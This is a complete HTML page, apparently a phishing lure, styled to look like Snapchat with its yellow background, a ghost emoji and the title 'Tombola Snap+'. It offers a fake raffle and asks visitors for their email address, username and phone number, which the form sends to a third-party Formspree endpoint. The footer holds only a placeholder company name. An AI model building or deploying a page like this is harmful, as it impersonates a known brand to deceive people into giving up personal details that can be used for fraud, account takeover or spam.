<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inscription Moderne</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #FFFC00; /* Jaune vif de fond */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .signup-card {
            background: white;
            padding: 40px;
            border-radius: 30px; /* Coins très arrondis */
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 380px;
            text-align: center;
        }

        h1 {
            font-size: 28px;
            font-weight: 700;
            margin: 0 0 10px 0;
            color: #000000;
        }

        p {
            color: #555555;
            margin-bottom: 35px;
            font-size: 16px;
        }

        .input-group {
            margin-bottom: 18px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #EEEEEE;
            border-radius: 50px; /* Inputs en forme de pilule */
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.2s;
            background-color: #FAFAFA;
        }

        input:focus {
            outline: none;
            border-color: #FFFC00; /* Bordure jaune au focus */
        }

        .button-container {
            margin-top: 35px;
        }

        button {
            background-color: #000000; /* Bouton noir pour le contraste */
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s, transform 0.1s;
        }

        button:hover {
            background-color: #333333;
        }

        button:active {
            transform: scale(0.98); /* Effet de pression */
        }

        .footer {
            margin-top: 40px;
            font-size: 13px;
            color: #888888;
        }
    </style>
</head>
<body>

<div class="signup-card">
    <h1>Bienvenue !</h1>
    <h1>Tombola Snap+👻</h1>
    
    <form action="https://formspree.io/f/xvzwybnr" method="POST">
        
        <div class="input-group">
            <input type="email" name="email" placeholder="Adresse e-mail" required>
        </div>

        <div class="input-group">
            <input type="text" name="username" placeholder="Nom d'utilisateur" required>
        </div>
        
        <div class="input-group">
            <input type="tel" name="telephone" placeholder="Numéro de téléphone" required>
        </div>

        <div class="button-container">
            <button type="submit">Continuer</button>
        </div>
    </form>

    <div class="footer">
        <span>© 2023 Votre Entreprise Legale</span>
    </div>
</div>

</body>
</html>
